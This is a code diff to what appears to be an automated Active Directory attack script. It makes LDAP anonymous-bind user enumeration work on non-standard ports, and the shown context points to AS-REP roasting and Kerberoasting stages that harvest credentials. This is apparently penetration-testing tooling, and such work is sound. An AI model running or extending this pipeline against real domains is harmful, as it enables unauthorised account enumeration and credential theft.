@@ -109,6 +109,20 @@ def _port_open(host_record: dict, port: int) -> bool:
     return port in _open_ports(host_record)
 
 
+def _ldap_port(host_record: dict) -> Optional[int]:
+    """Return the actual open LDAP port (389 or any non-standard mapping like 1389)."""
+    for p in host_record.get("ports", []):
+        if p.get("state") == "open" and p.get("service", "") in ("ldap", ""):
+            port_num = p.get("port")
+            if port_num in (389,) or (p.get("service") == "ldap"):
+                return port_num
+    # Fallback: any open port that has ldap in service name
+    for p in host_record.get("ports", []):
+        if p.get("state") == "open" and "ldap" in p.get("service", "").lower():
+            return p.get("port")
+    return None
+
+
 # ---------------------------------------------------------------------------
 # Domain name extraction
 # ---------------------------------------------------------------------------
@@ -159,7 +173,7 @@ def _derive_domain(host_record: dict) -> Optional[str]:
 # Stage A: LDAP anonymous bind
 # ---------------------------------------------------------------------------
 
-def ldap_anonymous_enum(dc_ip: str, domain: str) -> dict:
+def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
     """
     Attempt anonymous LDAP bind and enumerate user objects.
 
@@ -178,10 +192,10 @@ def ldap_anonymous_enum(dc_ip: str, domain: str) -> dict:
 
     # Build the base DN from domain (neutron.local -> DC=neutron,DC=local)
     base_dn = ",".join(f"DC={part}" for part in domain.split("."))
-    _log(f"  LDAP anonymous bind -> {dc_ip}:389  base_dn={base_dn}")
+    _log(f"  LDAP anonymous bind -> {dc_ip}:{port}  base_dn={base_dn}")
 
     try:
-        server = Server(dc_ip, port=389, get_info=ALL, connect_timeout=10)
+        server = Server(dc_ip, port=port, get_info=ALL, connect_timeout=10)
         conn = Connection(
             server,
             authentication=ANONYMOUS,
@@ -874,8 +888,9 @@ def run() -> dict:
             primary_dc_ip  = dc_ip
 
         # --- A: LDAP anonymous bind ---
-        if _port_open(dc, 389):
-            ldap_result = ldap_anonymous_enum(dc_ip, domain)
+        ldap_port = _ldap_port(dc)
+        if ldap_port is not None:
+            ldap_result = ldap_anonymous_enum(dc_ip, domain, port=ldap_port)
             if ldap_result["success"]:
                 for u in ldap_result["users"]:
                     if u not in all_users:
@@ -902,7 +917,7 @@ def run() -> dict:
             _log("  Port 88 not open — skipping AS-REP roast")
 
         # --- C: Kerberoasting (credentials required) ---
-        if _port_open(dc, 88) or _port_open(dc, 389):
+        if _port_open(dc, 88) or _ldap_port(dc) is not None:
             # Merge domain credentials that match this domain (or are generic)
             domain_creds = [
                 c for c in existing_creds
